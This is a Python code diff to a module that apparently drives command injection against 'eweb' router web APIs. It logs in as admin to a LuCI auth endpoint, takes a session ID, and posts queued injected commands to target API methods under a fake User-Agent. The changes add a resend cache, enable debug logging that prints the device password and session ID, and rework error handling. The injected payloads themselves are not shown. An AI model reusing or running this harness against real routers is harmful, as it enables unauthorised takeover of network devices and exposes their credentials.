@@ -1,3 +1,4 @@
+import copy
 import threading
 import time
 
@@ -7,7 +8,7 @@ from modules.encryption.eweb_password import encrypt_pass
 from modules.http_api import http_post
 
 p_lock = threading.Lock()
-debug = False
+debug = True
 
 
 def eweb_inject_cmd(params):
@@ -16,46 +17,50 @@ def eweb_inject_cmd(params):
         params = eweb_get_sid(params=params)
     p_lock.release()
     sid = params['eweb']['sid']
-    p_lock.acquire()
-    queue_len = len(params['wvt']['injected_api'])
-    while queue_len <= 0:
-        p_lock.release()
-        time.sleep(0.1)
+    if 'repost_again' in params['eweb'].keys() and params['eweb']['repost_again']:
+        params_http = params['eweb']['repost_cache']
+        params['eweb']['repost_again'] = False
+    else:
         p_lock.acquire()
         queue_len = len(params['wvt']['injected_api'])
-    api = params['wvt']['injected_api'].pop(0)
-    injected_cmd = params['wvt']['injected_cmd'].pop(0)
-    inject_method = params['wvt']['inject_method'].pop(0)
-    p_lock.release()
-    params_http = {
-        'http': {
-            'url': 'http://{}{}'.format(params['eweb']['ip'], api),
-            'params': {'auth': sid},
-            'data': {'params': injected_cmd, 'method': inject_method},
-            'headers': {'Content-Type': 'application/json', 'User-Agent': get_fake_ua()},
-            'timeout': 10.0
+        while queue_len <= 0:
+            p_lock.release()
+            time.sleep(0.1)
+            p_lock.acquire()
+            queue_len = len(params['wvt']['injected_api'])
+        api = params['wvt']['injected_api'].pop(0)
+        injected_cmd = params['wvt']['injected_cmd'].pop(0)
+        inject_method = params['wvt']['inject_method'].pop(0)
+        p_lock.release()
+        params_http = {
+            'http': {
+                'url': 'http://{}{}'.format(params['eweb']['ip'], api),
+                'params': {'auth': sid},
+                'data': {'params': injected_cmd, 'method': inject_method},
+                'headers': {'Content-Type': 'application/json', 'User-Agent': get_fake_ua()},
+                'timeout': 10.0
+            }
         }
-    }
     try:
-        params_http = http_post(params=params_http)
+        params['eweb']['repost_cache'] = copy.deepcopy(x=params_http)
+        http_post(params=params_http)
         if debug:
-            info_str = '对接口{}的{}方法注入{}请求完成'.format(api, inject_method, injected_cmd)
+            info_str = '对载荷{}的注入请求完成'.format(params['eweb']['repost_cache']['http']['data'])
             if 'log' in params.keys() and 'logger' in params['log'].keys():
                 logger = params['log']['logger']
                 logger.info(info_str)
             else:
                 print(info_str)
+        params['eweb']['exception'] = None
     except Exception as e:
-        # noinspection PyTypeChecker
-        params_http['http']['response'] = e
+        params['eweb']['exception'] = e
         if debug:
-            error_str = '对接口{}的{}方法注入{}发生错误{}'.format(api, inject_method, injected_cmd, repr(e))
+            error_str = '对载荷{}的注入发生错误{}'.format(params['eweb']['repost_cache']['http']['data'], repr(e))
             if 'log' in params.keys() and 'logger' in params['log'].keys():
                 logger = params['log']['logger']
                 logger.info(error_str)
             else:
                 print(error_str)
-        params['wvt']['inject_error'] = True
     return params
 
 
@@ -65,32 +70,52 @@ def eweb_get_sid(params):
         del params['eweb']['timestamp']
     else:
         timestamp = str(get_timestamp_now(is_millisecond=False))
-    if 'http' not in params.keys():
-        params['http'] = {}
-    params['http']['url'] = 'http://{}/cgi-bin/luci/api/auth'.format(params['eweb']['ip'])
-    params['http']['params'] = {}
-    params['http']['data'] = {
-        'params': {
-            'username': 'admin',
-            'encry': True,
-            'password': encrypt_pass(message=params['eweb']['pass']),
-            'time': timestamp
-        }, 'method': 'login'
+    params_http = {
+        'http': {
+            'url': 'http://{}/cgi-bin/luci/api/auth'.format(params['eweb']['ip']),
+            'params': {},
+            'data': {
+                'params': {
+                    'username': 'admin',
+                    'encry': True,
+                    'password': encrypt_pass(message=params['eweb']['pass']),
+                    'time': timestamp
+                }, 'method': 'login'
+            },
+            'headers': {'Content-Type': 'application/json', 'User-Agent': get_fake_ua()},
+            'timeout': 10.0
+        }
     }
-    params['http']['headers'] = {
-        'Content-Type': 'application/json',
-        'User-Agent': get_fake_ua()
-    }
-    params = http_post(params=params)
-    if params['http']['response'] is not int:
-        if params['http']['response']['data'] is not None:
-            sid = params['http']['response']['data']['sid']
+    try:
+        params_http = http_post(params=params_http)
+        if params_http['http']['response'] is not int:
+            if params_http['http']['response']['data'] is not None:
+                sid = params_http['http']['response']['data']['sid']
+            else:
+                sid = None
         else:
             sid = None
-    else:
-        sid = None
-    del params['http']['response']
-    params['eweb']['sid'] = sid
+        assert sid is not None
+        params['eweb']['sid'] = sid
+        if debug:
+            info_str = '对地址{}的设备使用密码{}请求SID完成，SID是{}'.format(
+                params['eweb']['ip'], params['eweb']['pass'], params['eweb']['sid']
+            )
+            if 'log' in params.keys() and 'logger' in params['log'].keys():
+                logger = params['log']['logger']
+                logger.info(info_str)
+            else:
+                print(info_str)
+        params['eweb']['exception'] = None
+    except Exception as e:
+        params['eweb']['exception'] = e
+        if debug:
+            error_str = '对地址{}的设备使用密码{}请求SID出错'.format(params['eweb']['ip'], params['eweb']['pass'])
+            if 'log' in params.keys() and 'logger' in params['log'].keys():
+                logger = params['log']['logger']
+                logger.info(error_str)
+            else:
+                print(error_str)
     return params
 
 
